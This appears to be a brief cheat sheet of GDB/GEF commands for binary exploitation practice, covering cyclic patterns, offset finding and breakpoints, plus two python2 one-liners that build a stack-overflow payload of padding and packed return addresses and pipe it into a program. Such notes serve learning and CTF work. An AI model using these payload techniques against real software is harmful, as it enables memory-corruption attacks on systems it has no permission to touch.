Gdb/Gef
=======
{% highlight bash%}
pattern create 200          :Create cyclic patterm
pattern offset              :Get the offset based on the value off RSP/ESP
info functions              :List fonctions
break * 0x00                :Break at 0x00

#python2 -c 'import struct;print "A"*40 + struct.pack("Q",0x400883)+struct.pack("Q",0x601060)+struct.pack("Q",0x4005e0)' > input
#python2 -c 'from pwn import *;print("A" * 40 + p64(0x0400883) + p64(0x00601060) + p64(0x00400810))' > input

r < input                   :Injecting payload to input
{% endhighlight %}
Additional ressources:
- [gef.readthedocs.io][link1]
- [hugsy][link2]
<br/>
[Back to the top](#header)
